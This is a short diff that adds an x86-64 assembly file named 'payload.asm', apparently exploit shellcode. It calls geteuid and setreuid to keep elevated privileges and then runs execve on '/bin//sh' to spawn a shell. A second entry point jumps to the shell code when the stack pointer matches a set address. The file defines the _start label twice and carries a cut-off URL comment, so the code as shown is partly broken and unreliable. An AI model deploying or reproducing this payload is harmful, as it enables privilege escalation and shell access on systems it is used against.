@@ -1,0 +1,39 @@
+# 1 "payload.asm"
+# 1 "<built-in>" 1
+# 1 "payload.asm" 2
+;; https:
+
+
+.text
+.globl _start
+_start:
+
+shell:
+ xor rax,rax
+ mov al, 107
+ syscall
+
+ mov rdi, rax
+ mov rsi, rax
+ xor rax,rax
+ mov al, 113
+ syscall
+
+ xor rax, rax
+ mov rbx, '/bin//sh'
+ push rax
+ push rbx
+ mov rdi, rsp
+
+ push rax
+ push rdi
+ mov rsi, rsp
+
+ xor rdx, rdx
+ mov al, 59
+ syscall
+
+_start:
+    ;; 0x700000 + 1024*1024 - 1
+    cmp rsp, 8388607
+    je shell
